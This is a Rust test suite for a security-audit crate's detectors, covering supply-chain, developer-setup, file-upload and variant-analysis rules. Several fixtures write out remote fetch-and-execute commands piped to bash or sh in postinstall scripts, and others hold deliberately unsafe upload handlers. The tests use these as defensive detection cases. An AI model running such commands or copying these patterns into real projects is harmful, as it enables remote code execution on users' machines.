//! Port of the wf063-owned JS test coverage (chunk wf063, area
//! `src/providers/security`, target crate `legion-audit`):
//! - `tests/security-l4/b7-018-supply-developer.test.mjs` (the
//!   `supply-chain.mjs` fixtures/assertions only — the other three packs
//!   that test file also covers, `developer-machine.mjs`/`automation.mjs`/
//!   `repository-footprint.mjs`, are outside this chunk).
//! - `tests/security-packs/extended-packs.test.mjs` (the `supply-developer`
//!   fixture/assertions only).
//! - `tests/security-l4/b7-015-boundaries.test.mjs` (the `uploads.mjs`
//!   fixtures/assertions only).
//! - `tests/security-variant-analysis.test.mjs` (in full — the whole file
//!   is this chunk's `variant-analysis.mjs`).
//!
//! Assertions that depend on `runSecurityPack`/`candidate-engine.mjs`
//! wrapping (`status`, `verdict: 'UNADJUDICATED'`, `adjudicationRequired`)
//! are outside this chunk's owned files (that engine is not ported here);
//! this suite asserts directly on each pack's `analyze(context)` output,
//! matching the underlying candidate-shape assertions the JS tests make
//! (`ruleId`, `severityHint`, `preconditions`, `detectorMetadata`,
//! `uncertainty`, `observedControls`, `evidenceRefs`).

use legion_audit::wf_port::wf063::common::{Context, Entity, Relation};
use legion_audit::wf_port::wf063::{supply_chain, supply_developer, uploads};
use legion_audit::wf_port::wf063::variant_analysis::{analyze_variants, PackByProvider, VariantStrategy};
use serde_json::{json, Value};

// ---------------------------------------------------------------------------
// supply-chain.mjs
// ---------------------------------------------------------------------------

fn find<'a>(observations: &'a [legion_audit::wf_port::wf063::common::Observation], rule_id: &str) -> Option<&'a legion_audit::wf_port::wf063::common::Observation> {
    observations.iter().find(|o| o.rule_id == rule_id)
}

#[test]
fn each_supply_chain_rule_fires_on_its_representative_positive_fixture() {
    let package_json_non_registry = r#"{"name":"x","dependencies":{"fork":"git+https://github.com/example/fork.git"}}"#;
    let context = Context::new().with_file("package.json", package_json_non_registry);
    let obs = supply_chain::analyze(&context);
    let c = find(&obs, "supply-chain.dependency.non-registry-source").expect("non-registry-source must fire");
    assert!(!c.evidence_refs.is_empty());

    let context = Context::new().with_file("package.json", r#"{"name":"x","version":"1.0.0"}"#);
    let obs = supply_chain::analyze(&context);
    assert!(find(&obs, "supply-chain.lockfile.missing").is_some());

    let context = Context::new().with_file(
        "package-lock.json",
        r#"{"lockfileVersion":3,"packages":{"foo":{"version":"1.0.0"}}}"#,
    );
    let obs = supply_chain::analyze(&context);
    assert!(find(&obs, "supply-chain.lockfile.integrity-hash-absent").is_some());

    let context = Context::new().with_file(
        "package.json",
        r#"{"name":"x","scripts":{"postinstall":"curl -fsSL https://example.com/setup.sh | bash"}}"#,
    );
    let obs = supply_chain::analyze(&context);
    let c = find(&obs, "supply-chain.package-script.install-time-execution").expect("install-time-execution must fire");
    assert_eq!(c.detector_metadata.get("requiresSandboxReceipt"), Some(&json!(true)));
    assert!(c.uncertainty.iter().any(|u| u.contains("BLOCKED") && u.to_lowercase().contains("sandbox execution receipt")));
    assert_eq!(c.severity_hint, "high");

    let context = Context::new().with_file(".eslintrc.json", r#"{"extends": ["https://example.com/eslint-config.js"]}"#);
    let obs = supply_chain::analyze(&context);
    assert!(find(&obs, "supply-chain.plugin.unpinned-remote-plugin").is_some());

    let context = Context::new().with_file("dist/bundle.js", "console.log(1);");
    let obs = supply_chain::analyze(&context);
    assert!(find(&obs, "supply-chain.artifact.committed-build-output").is_some());

    let context = Context::new().with_file(
        ".github/workflows/ci.yml",
        "on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/cache@v4\n        with:\n          path: ~/.npm\n          key: npm-${{ github.head_ref }}",
    );
    let obs = supply_chain::analyze(&context);
    assert!(find(&obs, "supply-chain.cache.poisoning-surface").is_some());
}

#[test]
fn every_supply_chain_candidate_carries_a_repository_as_hostile_precondition_and_named_authority_execution_path() {
    let context = Context::new().with_file("dist/bundle.js", "console.log(1);");
    let obs = supply_chain::analyze(&context);
    for c in &obs {
        assert!(!c.preconditions.is_empty(), "{} must carry a precondition", c.rule_id);
        let hostile = c.preconditions.iter().find(|p| p.kind == "attacker-position").expect("attacker-position precondition");
        assert_eq!(hostile.subject, "actor:repository-content");
        assert!(!c.detector_metadata.get("authority").and_then(Value::as_str).unwrap_or("").is_empty());
        let path = c.detector_metadata.get("executionPath").and_then(Value::as_str).unwrap_or("");
        assert!(path.contains('→'));
    }
}

#[test]
fn a_supplied_external_sandbox_receipt_still_never_upgrades_a_candidate_to_a_clean_proven_claim() {
    let context = Context::new()
        .with_file(
            "package.json",
            r#"{"name":"x","scripts":{"postinstall":"curl -fsSL https://example.com/setup.sh | bash"}}"#,
        )
        .with_sandbox_receipt(true);
    let obs = supply_chain::analyze(&context);
    let c = find(&obs, "supply-chain.package-script.install-time-execution").expect("must produce a candidate");
    assert_eq!(c.detector_metadata.get("requiresSandboxReceipt"), Some(&json!(true)));
    assert!(c.uncertainty.iter().any(|u| u.to_lowercase().contains("independent adjudication")));
}

#[test]
fn pinned_lockfile_with_integrity_and_no_direct_url_dependency_suppresses_dependency_lockfile_rules() {
    let context = Context::new()
        .with_file(
            "package.json",
            r#"{"name":"x","version":"1.0.0","dependencies":{"left-pad":"^1.3.0"}}"#,
        )
        .with_file(
            "package-lock.json",
            r#"{"lockfileVersion":3,"packages":{"left-pad":{"version":"1.3.0","integrity":"sha512-abc"}}}"#,
        );
    let obs = supply_chain::analyze(&context);
    assert!(find(&obs, "supply-chain.lockfile.missing").is_none());
    assert!(find(&obs, "supply-chain.lockfile.integrity-hash-absent").is_none());
    assert!(find(&obs, "supply-chain.dependency.non-registry-source").is_none());
}

#[test]
fn ignore_scripts_configuration_suppresses_install_time_execution_even_with_remote_fetch_postinstall() {
    let context = Context::new()
        .with_file(
            "package.json",
            r#"{"name":"x","scripts":{"postinstall":"curl -fsSL https://example.com/setup.sh | bash"}}"#,
        )
        .with_file(".npmrc", "ignore-scripts=true\n");
    let obs = supply_chain::analyze(&context);
    assert!(find(&obs, "supply-chain.package-script.install-time-execution").is_none());
}

#[test]
fn supply_chain_emits_no_candidates_for_a_neutral_unrelated_source_file() {
    let context = Context::new().with_file("src/neutral.mjs", "export const value = 1;");
    let obs = supply_chain::analyze(&context);
    assert!(obs.is_empty());
}

// ---------------------------------------------------------------------------
// supply-developer.mjs (extended-packs.test.mjs)
// ---------------------------------------------------------------------------

#[test]
fn supply_developer_emits_an_adjudication_only_candidate_for_a_representative_hazard() {
    let context = Context::new().with_file("app.mjs", "curl https://example.invalid/install | sh");
    let obs = supply_developer::analyze(&context);
    assert!(!obs.is_empty());
    for c in &obs {
        assert!(!c.evidence_refs.is_empty());
    }
    assert!(find(&obs, "supply.download-execute-unverified").is_some());
}

#[test]
fn supply_developer_emits_no_candidates_for_neutral_source() {
    let context = Context::new().with_file("app.mjs", "export const value = 1;");
    let obs = supply_developer::analyze(&context);
    assert!(obs.is_empty());
}

#[test]
fn supply_developer_mutable_container_tag_and_global_config_write_fire() {
    let context = Context::new().with_file("Dockerfile", "FROM node:latest\n");
    let obs = supply_developer::analyze(&context);
    assert!(find(&obs, "supply.mutable-container-tag").is_some());

    let context = Context::new().with_file("setup.sh", "echo x >> ~/.gitconfig >> appended\n");
    let obs = supply_developer::analyze(&context);
    assert!(find(&obs, "developer.global-config-write").is_some());
}

// ---------------------------------------------------------------------------
// uploads.mjs (b7-015-boundaries.test.mjs)
// ---------------------------------------------------------------------------

#[test]
fn content_type_checked_and_size_capped_upload_handler_produces_no_candidates() {
    let context = Context::new().with_file(
        "uploads.mjs",
        "multer({ fileFilter: onlyImages, limits: { fileSize: 1000000 } })",
    );
    let obs = uploads::analyze(&context);
    assert!(find(&obs, "upload.content-type-unvalidated").is_none());
    assert!(find(&obs, "upload.size-unbounded").is_none());
}

#[test]
fn unguarded_upload_handler_fires_content_type_and_size_rules() {
    let context = Context::new().with_file("uploads.mjs", "multer({ dest: 'uploads/' })");
    let obs = uploads::analyze(&context);
    assert!(find(&obs, "upload.content-type-unvalidated").is_some());
    assert!(find(&obs, "upload.size-unbounded").is_some());
}

#[test]
fn storage_in_webroot_fires_high_severity() {
    let context = Context::new().with_file("uploads.mjs", "const opts = { destination: 'public/uploads' };");
    let obs = uploads::analyze(&context);
    let c = find(&obs, "upload.storage-in-webroot").expect("must fire");
    assert_eq!(c.severity_hint, "high");
}

#[test]
fn filename_unsanitized_downgrades_when_a_sanitization_call_is_nearby() {
    let context = Context::new().with_file(
        "uploads.mjs",
        "path.join(dir, file.originalname)",
    );
    let obs = uploads::analyze(&context);
    let c = find(&obs, "upload.filename-unsanitized").expect("must fire");
    assert_eq!(c.severity_hint, "high");

    let context = Context::new().with_file(
        "uploads.mjs",
        "const safe = sanitizeFilename(file.originalname);\npath.join(dir, file.originalname)",
    );
    let obs = uploads::analyze(&context);
    let c = find(&obs, "upload.filename-unsanitized").expect("must still fire (lower severity)");
    assert_eq!(c.severity_hint, "low");
    assert!(c.uncertainty.iter().any(|u| u.contains("mitigating signal")));
}

#[test]
fn executable_content_served_downgrades_via_an_observed_control_relation() {
    let context = Context::new().with_file("app.mjs", "app.use(express.static(uploadsDir))");
    let obs = uploads::analyze(&context);
    let c = find(&obs, "upload.executable-content-served").expect("must fire");
    assert_eq!(c.severity_hint, "high");
    assert!(c.observed_controls.is_empty());

    let control = Entity {
        id: "control:content-disposition".to_string(),
        kind: "control".to_string(),
        name: "content-disposition attachment header".to_string(),
        attributes: json!({ "controlType": "content-disposition-attachment" }),
        evidence_refs: vec!["ev:control".to_string()],
    };
    let artifact_id = "artifact:app.mjs".to_string();
    let context = Context::new()
        .with_file("app.mjs", "app.use(express.static(uploadsDir))")
        .with_entity(control.clone())
        .with_relation(Relation { kind: "protects".to_string(), from: control.id.clone(), to: artifact_id });
    let obs = uploads::analyze(&context);
    let c = find(&obs, "upload.executable-content-served").expect("must still fire");
    assert_eq!(c.severity_hint, "low");
    assert_eq!(c.observed_controls, vec![control.id.clone()]);
    assert!(c.uncertainty.iter().any(|u| u.contains("downgraded pending adjudication")));
}

// ---------------------------------------------------------------------------
// variant-analysis.mjs (security-variant-analysis.test.mjs, ported in full)
// ---------------------------------------------------------------------------

fn binding_plan() -> Value {
    json!({
        "seal": { "digest": "sha256:plan" },
        "binding": {
            "repositoryRevision": "rev1", "dirtyPatchDigest": Value::Null,
            "blueprint": { "generationId": "gen1", "manifestDigest": "sha256:manifest" },
            "registryDigest": "sha256:registry",
        },
        "providers": [],
    })
}

fn binding_value() -> Value {
    json!({
        "planDigest": "sha256:plan", "repositoryRevision": "rev1", "dirtyPatchDigest": Value::Null,
        "blueprintGenerationId": "gen1", "blueprintManifestDigest": "sha256:manifest", "registryDigest": "sha256:registry",
    })
}

fn va_model() -> Value {
    json!({
        "schemaVersion": 1, "kind": "security-surface-model", "binding": binding_value(),
        "denominatorDigest": "sha256:denom", "complete": true,
        "entities": [], "relations": [], "initialFacts": [], "evidence": [],
        "coverage": {}, "coverageGaps": [],
    })
}

fn va_candidates(list: Vec<Value>) -> Value {
    json!({
        "schemaVersion": 1, "kind": "security-candidates", "binding": binding_value(),
        "denominatorDigest": "sha256:denom", "complete": true, "candidates": list,
    })
}

fn va_adjudication(verdicts: Vec<Value>) -> Value {
    json!({
        "schemaVersion": 1, "kind": "security-adjudication-result", "binding": binding_value(),
        "complete": true, "verdicts": verdicts,
    })
}

fn va_candidate() -> Value {
    json!({
        "id": "c1", "provider": "security.credentials", "providerVersion": "1", "ruleId": "credentials.format",
        "sources": [], "sinks": [], "assets": [], "requiredControls": [], "observedControls": [],
        "evidenceRefs": ["ev1"], "binding": binding_value(),
    })
}

fn va_verdict() -> Value {
    json!({
        "candidateId": "c1", "candidateProvider": "security.credentials", "verdict": "TRUE_POSITIVE",
        "evidenceStrength": "verified", "severity": "high",
        "rootCauseSignature": { "class": "credential-in-repository" },
    })
}

/// A test-only `VariantStrategy`/`PackByProvider` pair mirroring the JS
/// `strategyPack()` fixture, with a swappable `enumerate` result so
/// individual tests can drive different denominator/match shapes exactly
/// like the JS tests reassign `pack.variantStrategies['credentials.format'].enumerate`.
struct FixtureStrategy {
    enumerate_result: Value,
}

impl VariantStrategy for FixtureStrategy {
    fn root_cause(&self, _candidate: &Value, _verdict: &Value) -> Value {
        json!({ "class": "credential-in-repository" })
    }
    fn enumerate(&self, _plan: &Value, _model: &Value, _candidate: &Value, _verdict: &Value, _binding: &Value, _sig: &Value) -> Value {
        self.enumerate_result.clone()
    }
}

struct FixturePack {
    strategy: Option<FixtureStrategy>,
}

impl PackByProvider for FixturePack {
    fn strategy_for(&self, provider: &str, rule_id: &str) -> Option<&dyn VariantStrategy> {
        if provider == "security.credentials" && rule_id == "credentials.format" {
            self.strategy.as_ref().map(|s| s as &dyn VariantStrategy)
        } else {
            None
        }
    }
}

fn default_enumerate_result() -> Value {
    json!({
        "denominator": { "kind": "source-files", "digest": "sha256:d", "expected": 2, "examined": 2, "unexamined": [] },
        "strategies": [{ "id": "s1", "kind": "lexical-fallback", "complete": true, "coverageGaps": [], "queryDigest": "sha256:q" }],
        "matches": [
            { "file": "a.ts", "line": 3, "semanticFingerprint": "sha256:f1", "disposition": "CONFIRMED" },
            { "file": "b.ts", "line": 9, "semanticFingerprint": "sha256:f2", "disposition": "REJECTED", "rationale": "mitigated" },
        ],
        "coverageGaps": [],
    })
}

#[test]
fn surviving_finding_with_a_complete_strategy_produces_a_complete_receipt() {
    let pack = FixturePack { strategy: Some(FixtureStrategy { enumerate_result: default_enumerate_result() }) };
    let result = analyze_variants(&binding_plan(), &va_model(), &va_candidates(vec![va_candidate()]), &va_adjudication(vec![va_verdict()]), &pack).unwrap();
    assert_eq!(result["complete"], json!(true));
    assert_eq!(result["receipts"].as_array().unwrap().len(), 1);
    assert_eq!(result["receipts"][0]["complete"], json!(true));
    assert_eq!(result["receipts"][0]["summary"]["confirmed"], json!(1));
    assert_eq!(result["receipts"][0]["summary"]["rejected"], json!(1));
}

#[test]
fn surviving_finding_without_a_strategy_is_incomplete_with_a_gap() {
    let pack = FixturePack { strategy: None };
    let result = analyze_variants(&binding_plan(), &va_model(), &va_candidates(vec![va_candidate()]), &va_adjudication(vec![va_verdict()]), &pack).unwrap();
    assert_eq!(result["complete"], json!(false));
    assert!(result["coverageGaps"].as_array().unwrap().iter().any(|g| g["kind"] == "variant-incomplete"));
    assert!(result["receipts"][0]["coverageGaps"].as_array().unwrap().iter().any(|g| g == "missing-variant-strategy"));
}

#[test]
fn incomplete_denominator_is_incomplete() {
    let mut enumerate_result = default_enumerate_result();
    enumerate_result["denominator"] = json!({ "kind": "source-files", "digest": "sha256:d", "expected": 10, "examined": 9, "unexamined": ["z.ts"] });
    enumerate_result["matches"] = json!([]);
    let pack = FixturePack { strategy: Some(FixtureStrategy { enumerate_result }) };
    let result = analyze_variants(&binding_plan(), &va_model(), &va_candidates(vec![va_candidate()]), &va_adjudication(vec![va_verdict()]), &pack).unwrap();
    assert_eq!(result["receipts"][0]["complete"], json!(false));
}

#[test]
fn unresolved_matches_make_the_receipt_incomplete() {
    let mut enumerate_result = default_enumerate_result();
    enumerate_result["denominator"] = json!({ "kind": "source-files", "digest": "sha256:d", "expected": 1, "examined": 1, "unexamined": [] });
    enumerate_result["matches"] = json!([{ "file": "a.ts", "line": 3, "semanticFingerprint": "sha256:f", "disposition": "UNRESOLVED" }]);
    let pack = FixturePack { strategy: Some(FixtureStrategy { enumerate_result }) };
    let result = analyze_variants(&binding_plan(), &va_model(), &va_candidates(vec![va_candidate()]), &va_adjudication(vec![va_verdict()]), &pack).unwrap();
    assert_eq!(result["receipts"][0]["complete"], json!(false));
    assert_eq!(result["receipts"][0]["summary"]["unresolved"], json!(1));
}

#[test]
fn false_positive_candidates_never_generate_variant_receipts() {
    let mut verdict = va_verdict();
    verdict["verdict"] = json!("FALSE_POSITIVE");
    let pack = FixturePack { strategy: Some(FixtureStrategy { enumerate_result: default_enumerate_result() }) };
    let result = analyze_variants(&binding_plan(), &va_model(), &va_candidates(vec![va_candidate()]), &va_adjudication(vec![verdict]), &pack).unwrap();
    assert_eq!(result["receipts"].as_array().unwrap().len(), 0);
    assert_eq!(result["complete"], json!(true));
}

#[test]
fn stale_binding_is_rejected() {
    let mut stale_candidates = va_candidates(vec![va_candidate()]);
    let mut binding = binding_value();
    binding["repositoryRevision"] = json!("other");
    stale_candidates["binding"] = binding;
    let pack = FixturePack { strategy: None };
    let err = analyze_variants(&binding_plan(), &va_model(), &stale_candidates, &va_adjudication(vec![va_verdict()]), &pack).unwrap_err();
    assert!(err.0.contains("does not match"));
}

#[test]
fn receipt_summary_counts_must_match_the_match_list() {
    let mut enumerate_result = default_enumerate_result();
    enumerate_result["denominator"] = json!({ "kind": "source-files", "digest": "sha256:d", "expected": 1, "examined": 1, "unexamined": [] });
    enumerate_result["matches"] = json!([{ "file": "a.ts", "line": 3, "semanticFingerprint": "sha256:f", "disposition": "CONFIRMED" }]);
    let pack = FixturePack { strategy: Some(FixtureStrategy { enumerate_result }) };
    let result = analyze_variants(&binding_plan(), &va_model(), &va_candidates(vec![va_candidate()]), &va_adjudication(vec![va_verdict()]), &pack).unwrap();
    let receipt = &result["receipts"][0];
    let match_len = receipt["matches"].as_array().unwrap().len() as u64;
    assert_eq!(receipt["summary"]["enumerated"].as_u64().unwrap(), match_len);
    assert_eq!(receipt["summary"]["examined"].as_u64().unwrap(), match_len);
}
